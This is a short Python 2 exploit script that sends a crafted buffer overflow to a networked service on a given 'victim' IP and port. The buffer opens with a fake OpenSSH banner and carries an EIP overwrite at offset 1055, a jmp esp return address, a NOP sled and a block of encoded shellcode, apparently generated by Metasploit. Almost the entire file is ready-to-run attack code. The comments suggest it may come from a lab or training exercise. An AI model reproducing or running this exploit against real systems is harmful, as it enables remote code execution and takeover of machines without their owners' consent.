#!/usr/bin/python

## NOTE: sshd server uses port 22

import sys
import argparse
import socket


# user input
program_description = "The program inputs ip and port of the victim pc"
parser = argparse.ArgumentParser(program_description)
parser.add_argument("target_ip", help="Target IP")
parser.add_argument("target_port", type=int, help="Target Port")
args = parser.parse_args()

# global parameters
user_input = (args.target_ip, args.target_port)

# function definitions
def buffer_gen():
    # prepending header
    buf = "\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"
   
    # 1055 is the eip offset
    buf = buf + 'A' * 1055
    
    # adding the eip (memory of jmp esp)in format: reverse order due to endianess
    eip = "\xA4\x23\x49\x7E"
    buf = buf + eip + 'AAAA'        # including the padding 4bytes  for this exploit, due to the difference in offset of eip and esp 
    # adding the eip and no-op padding
    noop = "\x90" * 20                  # 5 layer padding
    buf = buf + noop

    # adding payload
    buf += "\xdb\xc4\xb8\x60\x05\x39\x84\xd9\x74\x24\xf4\x5b\x2b"
    buf += "\xc9\xb1\x53\x31\x43\x17\x83\xc3\x04\x03\x23\x16\xdb"
    buf += "\x71\x5f\xf0\x99\x7a\x9f\x01\xfe\xf3\x7a\x30\x3e\x67"
    buf += "\x0f\x63\x8e\xe3\x5d\x88\x65\xa1\x75\x1b\x0b\x6e\x7a"
    buf += "\xac\xa6\x48\xb5\x2d\x9a\xa9\xd4\xad\xe1\xfd\x36\x8f"
    buf += "\x29\xf0\x37\xc8\x54\xf9\x65\x81\x13\xac\x99\xa6\x6e"
    buf += "\x6d\x12\xf4\x7f\xf5\xc7\x4d\x81\xd4\x56\xc5\xd8\xf6"
    buf += "\x59\x0a\x51\xbf\x41\x4f\x5c\x09\xfa\xbb\x2a\x88\x2a"
    buf += "\xf2\xd3\x27\x13\x3a\x26\x39\x54\xfd\xd9\x4c\xac\xfd"
    buf += "\x64\x57\x6b\x7f\xb3\xd2\x6f\x27\x30\x44\x4b\xd9\x95"
    buf += "\x13\x18\xd5\x52\x57\x46\xfa\x65\xb4\xfd\x06\xed\x3b"
    buf += "\xd1\x8e\xb5\x1f\xf5\xcb\x6e\x01\xac\xb1\xc1\x3e\xae"
    buf += "\x19\xbd\x9a\xa5\xb4\xaa\x96\xe4\xd0\x1f\x9b\x16\x21"
    buf += "\x08\xac\x65\x13\x97\x06\xe1\x1f\x50\x81\xf6\x60\x4b"
    buf += "\x75\x68\x9f\x74\x86\xa1\x64\x20\xd6\xd9\x4d\x49\xbd"
    buf += "\x19\x71\x9c\x28\x11\xd4\x4f\x4f\xdc\xa6\x3f\xcf\x4e"
    buf += "\x4f\x2a\xc0\xb1\x6f\x55\x0a\xda\x18\xa8\xb5\xf5\x84"
    buf += "\x25\x53\x9f\x24\x60\xcb\x37\x87\x57\xc4\xa0\xf8\xbd"
    buf += "\x7c\x46\xb0\xd7\xbb\x69\x41\xf2\xeb\xfd\xca\x11\x28"
    buf += "\x1c\xcd\x3f\x18\x49\x5a\xb5\xc9\x38\xfa\xca\xc3\xaa"
    buf += "\x9f\x59\x88\x2a\xe9\x41\x07\x7d\xbe\xb4\x5e\xeb\x52"
    buf += "\xee\xc8\x09\xaf\x76\x32\x89\x74\x4b\xbd\x10\xf8\xf7"
    buf += "\x99\x02\xc4\xf8\xa5\x76\x98\xae\x73\x20\x5e\x19\x32"
    buf += "\x9a\x08\xf6\x9c\x4a\xcc\x34\x1f\x0c\xd1\x10\xe9\xf0"
    buf += "\x60\xcd\xac\x0f\x4c\x99\x38\x68\xb0\x39\xc6\xa3\x70"
    buf += "\x49\x8d\xe9\xd1\xc2\x48\x78\x60\x8f\x6a\x57\xa7\xb6"
    buf += "\xe8\x5d\x58\x4d\xf0\x14\x5d\x09\xb6\xc5\x2f\x02\x53"
    buf += "\xe9\x9c\x23\x76"

    # we are adding the 23kB of buffer since our eip is only at 1kb while it takes around 24kb to cause an overflow
    buf = buf + ('A' * 23000) + '\r\n'
    return buf

def socket_setup(ip, port):
    # socket creatation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # connecting
    s.connect((ip, port))
    return s

def main(input_tuple):          # Input tuple has the following structure: (ip, port)
    s = socket_setup(input_tuple[0], input_tuple[1])
    buf = buffer_gen()

    print "sending buffer: ", buf
    s.send(buf)

    try:
#        recv = s.recv(1024)
#        print "server says: ", recv
        
        while 1:
            pass
    except KeyboardInterrupt:
        print "\n[!] Closing Exploit"
        s.close()
        sys.exit(0)         # gracefully exits upon ctrl-c

# script execution
if __name__ == "__main__":
    main(user_input)        # calling main function

